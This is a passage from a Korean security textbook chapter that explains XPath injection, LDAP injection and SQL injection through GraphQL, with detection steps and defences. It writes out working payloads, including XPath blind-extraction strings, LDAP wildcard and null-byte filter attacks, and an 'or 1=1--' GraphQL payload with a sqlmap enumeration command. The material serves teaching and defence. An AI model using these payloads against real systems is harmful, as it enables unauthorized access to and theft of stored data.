> NoSQL은 빠르게 진화하는 비교적 새로운 기술로, MongoDB의 JavaScript 인젝션 외에도 연산자 인젝션($ne, $gt 등을 JSON으로 주입하는 형태), Redis·Cassandra·CouchDB 등 저장소별 고유한 질의 인터페이스에 대한 공격이 존재한다. 그러나 이 책이 근거로 삼는 다섯 권의 범위는 MongoDB의 JavaScript 질의 인젝션까지다. 저장소 종류별 확대와 연산자 인젝션의 최신 기법은 이 책의 범위를 넘어선다. 여기서 붙잡을 것은 기법의 목록이 아니라 구조다 — 질의 언어가 SQL이든 JavaScript든, 데이터와 구분자가 채널을 공유하면 같은 취약점이 재현된다.

## 27.12 XPath 인젝션 — 애플리케이션 로직 전복, informed·blind XPath, 방어

**XPath(XML Path Language)** 는 XML 문서를 탐색해 데이터를 뽑는 해석 언어다. 웹 애플리케이션이 XML 문서에 데이터를 저장하고 사용자 입력에 따라 XPath로 접근할 때, 입력이 필터 없이 질의에 들어가면 공격자는 질의를 조작할 수 있다. XML은 엔터프라이즈 데이터 저장에 선호되지는 않지만, 애플리케이션 설정 데이터나 소규모 애플리케이션의 자격증명·역할·권한 저장에 자주 쓰인다.

다음 XML 저장소를 보자.

```xml
<addressBook>
  <address>
    <firstName>William</firstName>
    <surname>Gates</surname>
    <password>MSRocks!</password>
    <email>billyg@microsoft.com</email>
    <ccard>5130 8190 3282 3515</ccard>
  </address>
  <address>
    <firstName>Chris</firstName>
    <surname>Dawes</surname>
    <password>secret</password>
    <email>cdawes@craftnet.de</email>
    <ccard>3981 2491 3242 3121</ccard>
  </address>
  ...
</addressBook>
```

사용자 Dawes의 신용카드를 조회하는 XPath 질의는 이렇다.

```
//address[surname/text()='Dawes' and password/text()='secret']/ccard/text()
```

### 27.12.1 애플리케이션 로직 전복

공격자는 SQL 인젝션과 똑같이 질의를 전복한다. 비밀번호 자리에 다음을 넣으면,

```
' or 'a'='a
```

질의는 이렇게 되어 모든 사용자의 신용카드를 반환한다.

```
//address[surname/text()='Dawes' and password/text()='' or 'a'='a']/ccard/text()
```

> **주의.** SQL처럼, 숫자 값에 인젝션할 때는 작은따옴표가 필요 없다. SQL과 달리, XPath 키워드는 대소문자를 구분하며 XML 문서의 요소 이름도 그렇다.

### 27.12.2 Informed XPath 인젝션

조건에 따라 애플리케이션이 다르게 응답하게 만들어 정보를 한 바이트씩 뽑는다. SQL과 같은 추론 기법이다. 다음 두 비밀번호는 다른 동작을 유발한다(첫 경우만 결과 반환).

```
' or 1=1 and 'a'='a
' or 1=2 and 'a'='a
```

XPath에도 `substring` 함수가 있어 문자열을 한 글자씩 검사한다. 다음 비밀번호는 Gates의 비밀번호 첫 글자가 `M`이면 결과를 반환한다.

```
' or //address[surname/text()='Gates' and substring(password/text(),1,1)='M'] and 'a'='a
```

각 문자 위치를 순회하며 Gates의 비밀번호 전체를 뽑는다.

### 27.12.3 Blind XPath 인젝션

위 공격은 경로(`address`)와 필드 이름(`surname`, `password`)을 알아야 했다. 그러나 **완전 블라인드** 공격이 가능하다. XPath는 현재 노드 기준 상대 경로를 지원하고, 노드의 메타 정보(이름 등)를 질의하는 함수를 가진다. 이를 이용해 구조를 전혀 모른 채 모든 노드의 이름과 값을 뽑는다.

부모 노드 이름을 뽑으려면 다음 형태의 비밀번호를 순회한다.

```
' or substring(name(parent::*[position()=1]),1,1)='a
```

`address` 노드의 첫 글자가 `a`이므로 결과가 나온다. 인덱스로 자식 노드를 지정하면 이름을 몰라도 값을 뽑는다. 다음은 `Hunter`를, 그다음은 `letmein`을 반환한다.

```
//address[position()=3]/child::node()[position()=4]/text()
//address[position()=3]/child::node()[position()=6]/text()
```

두 함수가 자동화를 돕는다. `count()`는 자식 노드 수를 반환해 `position()`의 범위를, `string-length()`는 문자열 길이를 반환해 `substring()`의 범위를 정해 준다.

### 27.12.4 XPath 인젝션 탐지와 방어

SQL 인젝션 탐침에 쓰는 문자열 상당수가 XPath 취약 함수에 넣으면 이상 동작을 낸다. `'`나 `' or '1'='1`은 대개 질의를 무효화해 오류를 내고, `' or 'a'='a`, `' and 'a'='b` 같은 것은 오류 없이 동작을 바꾼다. SQL 인젝션 검사가 취약 정황을 보이는데 확증되지 않으면 XPath 인젝션을 의심하라. 다음을 넣어 오류 없이 동작이 갈리는지 본다.

```
' or count(parent::*[position()=1])=0 or 'a'='b
' or count(parent::*[position()=1])>0 or 'a'='b
```

**방어.** XPath 질의에 사용자 입력을 넣어야 한다면 엄격한 입력 검증이 가능한 단순 데이터에만 한정한다. 허용 문자 화이트리스트(이상적으로 영숫자만)로 검사하고, XPath 질의를 교란할 수 있는 문자 — `( ) = ' [ ] /`와 모든 공백 — 를 차단한다. **화이트리스트에 맞지 않는 입력은 정제하지 말고 거부한다.**

## 27.13 LDAP 인젝션 — 익스플로잇, 탐지, 방어

**LDAP(Lightweight Directory Access Protocol)** 는 네트워크로 디렉터리 서비스에 접근하는 데 쓰인다. 디렉터리는 계층적 데이터 저장소로, 이름·전화번호·이메일·직무 같은 개인 데이터를 흔히 담는다. Windows 도메인의 Active Directory와 OpenLDAP이 대표적이며, 기업 인트라넷 웹 애플리케이션 — 직원 정보를 조회·수정하는 HR 애플리케이션 등 — 에서 자주 만난다.

각 LDAP 질의는 하나 이상의 검색 필터를 쓴다. 흔한 필터 유형은 셋이다.

```
(username=daf)                                    -- 단순 매칭
(|(cn=검색어)(sn=검색어)(ou=검색어))              -- 논리합(disjunctive): 하나라도 만족
(&(username=daf)(password=secret))                -- 논리곱(conjunctive): 모두 만족
```

사용자 입력이 검증 없이 필터에 들어가면 공격자가 필터 구조를 바꿀 수 있다. 다만 LDAP 인젝션은 SQL만큼 쉽게 익스플로잇되지 않는다. 세 가지 이유 때문이다. 논리 연산자(`|`, `&`)가 사용자 입력 **앞에** 오는 경우가 많아 수정할 수 없으므로, 단순 매칭·논리곱 질의에는 SQL의 `OR 1=1`에 해당하는 것이 없다. 반환할 속성이 검색 필터와 별개 파라미터로 넘겨져 대개 하드코딩되므로, 다른 속성을 뽑도록 조작하기 어렵다. 그리고 정보성 오류 메시지가 드물어 대개 블라인드로 익스플로잇해야 한다.

### 27.13.1 익스플로잇

**논리합 질의.** 사용자가 인가된 지역(London, Reading)의 직원만 검색하도록 애플리케이션이 논리합 질의를 만든다고 하자.

```
(|(department=London sales)(department=Reading sales))
```

공격자가 검색어로 `)(department=*`를 넣으면(`*`는 LDAP 와일드카드),

```
(|(department=London )(department=*)(department=Reading )(department=*))
```

와일드카드 항이 모든 디렉터리 항목에 매칭되어, 모든 지역의 전 직원이 반환된다. 접근 제어가 전복된다.

**논리곱 질의.** 인가 지역을 논리곱으로 강제하는 경우다.

```
(&(givenName=daf)(department=London*))
```

백엔드 구현에 따라 두 공격이 통한다. OpenLDAP 등 일부 구현은 여러 검색 필터를 배치로 받아 논리합으로 적용한다. 공격자가 `*))(&(givenName=daf`를 넣으면,

```
(&(givenName=*))(&(givenName=daf)(department=London*))
```

첫 필터가 단일 와일드카드 매칭이 되어 전 직원이 반환된다. 두 번째 공격은 **널 바이트**를 이용한다. LDAP 구현 상당수가 네이티브 코드로 작성되어, 검색 필터 내 널 바이트가 문자열을 끝내고 이후를 무시한다. LDAP은 주석을 지원하지 않지만, 이 널 바이트 처리가 사실상 "나머지를 주석 처리"하는 효과를 낸다. `*))%00`을 넣으면 애플리케이션 서버가 `%00`을 리터럴 널로 디코딩해,

```
(&(givenName=*))<NULL>)(department=London*))
```

가 되고, 필터가 널에서 잘려 단일 와일드카드 조건만 남는다.

### 27.13.2 탐지와 방어

정보성 오류가 드물므로, 검색 결과와 HTTP 500 여부로 진단한다.

1. `*`를 검색어로 넣는다. LDAP에서는 와일드카드지만 SQL에서는 아니다. 많은 결과가 돌아오면 LDAP 질의를 다루고 있다는 좋은 정황이다.
2. 닫는 괄호를 여럿(`))))))))))` ) 넣는다. 입력을 감싼 괄호와 필터 자체의 괄호를 닫아 구문을 무효화한다. 오류가 나면 취약할 수 있다.
3. 여러 질의 유형을 교란하는 표현을 넣어 결과에 영향을 주는지 본다. `cn` 속성은 모든 LDAP 구현이 지원하므로 유용하다: `)(cn=*`, `*))(|(cn=*`, `*))%00`.

**방어.** XPath와 같다. 사용자 입력을 LDAP 질의에 넣어야 한다면 엄격한 검증이 가능한 단순 데이터에만 한정하고, 허용 문자 화이트리스트(이상적으로 영숫자만)로 검사한다. LDAP 질의를 교란할 문자 — `( ) ; , * [ ] & = |`와 널 바이트 — 를 차단하고, **맞지 않는 입력은 정제하지 말고 거부한다.**

> **이 절이 뒷받침하는 것**
>
> - LDAP·XPath 인젝션의 화이트리스트 방어와 "정제 말고 거부" 원칙 → **43.6**(입력 처리 방식의 비교: 거부·정제·안전한 처리)이 네 방식을 대조하며 상세화.
> - LDAP이 인가 경계를 강제하는 질의를 전복당하는 구조 → **24.7**(인가는 경계 검증의 한 형태)과 같은 뿌리.

## 27.14 GraphQL을 경유한 SQL 인젝션

GraphQL은 이 책 Part VIII의 주제이지만, 인젝션의 관점에서 GraphQL이 무엇을 바꿨는지는 이 자리에서 짚어야 한다. 결론부터 말하면 **GraphQL은 새로운 인젝션을 만들지 않았다. 새로운 진입점을 만들었을 뿐이다.**

SQL 인젝션은 클라이언트 입력이 문자 이스케이프 없이 SQL 명령에 직접 들어갈 때 생긴다. GraphQL API의 리졸버(resolver)가 백엔드에서 SQL 질의를 만들 때 GraphQL 인자를 그대로 이어 붙이면, 정확히 같은 취약점이 생긴다. GraphQL이라는 계층은 SQL 인젝션의 성질을 조금도 바꾸지 않는다. 다만 공격자가 페이로드를 넣는 **인터페이스**가 REST 파라미터에서 GraphQL 인자로 바뀔 뿐이다. GraphQL은 클라이언트 입력을 받는 모든 인터페이스가 그렇듯, SQL 인젝션을 위한 새 관문이 된다.

취약한 GraphQL 애플리케이션 DVGA를 예로 든다. `pastes` 질의는 `filter` 인자(문자열)를 받는데, 이름이 시사하듯 결과를 거르므로 SQL 인젝션 후보다.

```graphql
query {
  pastes(filter:"My First Paste") {
    id
    content
    title
  }
}
```

이 질의는 뒤에서 다음과 비슷한 SQL을 만든다.

```sql
SELECT id, content, title FROM pastes WHERE content LIKE 'My First Paste'
```

`filter`에 작은따옴표를 더하면(`My First Paste'`) SQL이 깨져, `sqlite3.OperationalError`가 GraphQL 응답의 `errors` 키로 반환된다. 이것은 인젝션 정황인 동시에 **정보 노출**이다 — 오류가 백엔드 데이터베이스(SQLite)와 스키마 구조를 드러내, 더 정밀한 페이로드를 짜게 해 준다. GraphQL 오류 메시지가 이렇게 정보를 흘리는 문제는 30.10절이 상세히 다룬다.

이제 고전적 페이로드를 넣는다.

```graphql
query {
  pastes(filter:"My First Paste' or 1=1--") {
    title
    content
  }
}
```

백엔드 SQL은 이렇게 된다.

```sql
SELECT id, content, title FROM pastes WHERE content LIKE 'My First Paste' or 1=1--'
```

작은따옴표로 `LIKE` 패턴을 끝내고, `or 1=1`로 항상 참인 조건을 넣고, `--`로 뒤의 따옴표를 주석 처리한다. 27.2절에서 서점 검색을 털던 바로 그 페이로드다. 응답에 DVGA의 모든 paste가 담긴다 — 불리언 기반 SQL 인젝션이다. sqlmap도 그대로 쓸 수 있다. GraphQL 질의에서 인젝션 지점을 별표(`*`)로 표시하고 HTTP 요청을 파일로 저장해 넘기면, sqlmap이 그 자리에 페이로드를 넣어 테이블까지 열거한다.

```
# sqlmap -r request.txt --dbms=sqlite --tables
```

여기서 확인할 것은 이 장 전체의 논지가 진입점만 바뀐 채 그대로 성립한다는 사실이다. 방어도 그대로다 — 리졸버가 SQL을 만들 때 파라미터화 질의(→ 27.9)를 쓰고, GraphQL 인자를 도메인 프리미티브로 받으면(→ 27.10) 인젝션은 막힌다.

> **28장과의 경계.** GraphQL 리졸버가 SQL이 아니라 운영체제 명령이나 아웃바운드 요청을 만들 때 생기는 OS 명령 인젝션과 SSRF는 28장이 다룬다(→ 28.10). 이 절은 리졸버 → SQL 경로, 28.10절은 리졸버 → 셸/네트워크 경로다. 진입점은 같은 GraphQL 인자이지만, 도달하는 백엔드 컴포넌트가 다르다.

## 이 장의 요약

- **인젝션의 본질은 데이터와 구분자가 같은 채널을 공유한다는 하나의 구조다.** SQL·NoSQL·XPath·LDAP·GraphQL은 인터프리터와 구분자 문자가 다를 뿐 같은 결함이며, 8.7절(CR/LF)·10.4절(본문 경계)·16.6절(로그 인젝션)에서 이미 세 번 본 구조의 재현이다.
- **로그인 우회(`admin'--`, `' OR 1=1--`)는 인젝션의 가장 짧은 증명이다.** 작은따옴표가 프로그래머의 문자열을 닫고, 주석이 나머지 질의를 지워, 데이터가 질의 구조를 바꾼다.
- **SQL 인젝션은 문·유형을 가리지 않는다.** `SELECT`뿐 아니라 `INSERT`·`UPDATE`·`DELETE`에서도 생기며, `WHERE`를 무력화하는 `UPDATE`/`DELETE` 인젝션은 전체 행을 파괴할 수 있다.
- **결과를 되돌려받는 채널이 없어도 익스플로잇은 가능하다.** UNION이 막히면 조건부 응답·조건부 오류(`1/0`)·시간 지연(`WAITFOR`/`SLEEP`)으로 한 비트씩, DNS·HTTP 같은 대역 외 채널로 대량으로 데이터를 뽑는다. 특히 DNS가 유출 채널이 되는 것은 2.3절의 이름 해석 구조 때문이다.
- **SQL 인젝션은 데이터베이스를 넘어 OS 명령·파일 접근으로 번진다.** `xp_cmdshell`·`utl_file`·`load_file`이 그 통로이며, 이는 DB를 경유한 OS 접근으로 28장의 직접 명령 인젝션과 구별된다.
- **파라미터화 질의가 효과 있는 것은 우연이 아니라 구조다.** 질의 구조를 먼저 확정하고 데이터를 나중에 바인딩하므로, 데이터가 구조를 바꿀 채널 자체가 사라진다. 이스케이프(사후적·목록적)와 달리 인젝션의 발판을 없앤다.
- **도메인 프리미티브는 그 방어를 타입 수준으로 끌어올린다.** 문자열이 아니라 불변식을 가진 타입으로 다루면, 검증되지 않은 문자열이 애초에 질의에 문자열로 도달하지 못한다. 이것이 이 책의 고유한 기여이며 44장이 상세화한다.
- **GraphQL은 새 인젝션이 아니라 새 진입점이다.** 리졸버가 SQL을 문자열 연접으로 만들면 REST에서와 똑같은 SQL 인젝션이 생기고, 방어도 똑같다.

## 이어지는 장

이 장은 사용자 입력이 서버 측 해석 컨텍스트 중 **데이터 저장소**를 겨냥할 때 무엇이 되는지를 다뤘다. 그러나 데이터 저장소는 애플리케이션이 이야기를 나누는 여러 백엔드 컴포넌트 중 하나일 뿐이다. 같은 입력이 다른 컴포넌트를 겨냥하면 다른 이름의 인젝션이 된다 — 그리고 그 이름들 밑에는 이 장이 밝힌 것과 정확히 같은 구조가 있다.

28장은 그 나머지 컴포넌트로 공격을 확장한다. 사용자 입력이 운영체제 셸에 직접 들어가면 OS 명령 인젝션(→ 28.1)이고, 파일 경로에 들어가면 경로 순회(→ 28.3)이며, XML 파서에 들어가면 XXE(→ 28.5)이고, 백엔드로 나가는 HTTP 요청에 들어가면 SSRF(→ 28.8)다. 27.7절에서 우리는 데이터베이스를 **경유해** 운영체제에 이르렀다. 28장은 데이터베이스를 건너뛰고 애플리케이션에서 곧장 운영체제·파일시스템·다른 서버로 간다. 두 장은 같은 무기(검증되지 않은 입력)를 다른 백엔드에 겨눈다.

그리고 이 장이 두 번 예고한 설계 관점 — 파라미터화 질의가 왜 구조적으로 효과 있는지(27.9), 도메인 프리미티브가 왜 그보다 깊은지(27.10) — 는 Part IX에서 회수된다. 43장이 검증의 순서와 경계 검증으로, 44장이 도메인 프리미티브와 상태 무결성으로 이 장의 방어 논의를 코드 구조의 언어로 완성한다. 이 장에서 우리는 "위험한 문자를 거르지 말고, 위험한 값이 존재할 수 없게 하라"고 말했다. 그 명령을 코드가 저절로 지키게 만드는 방법이 설계다.
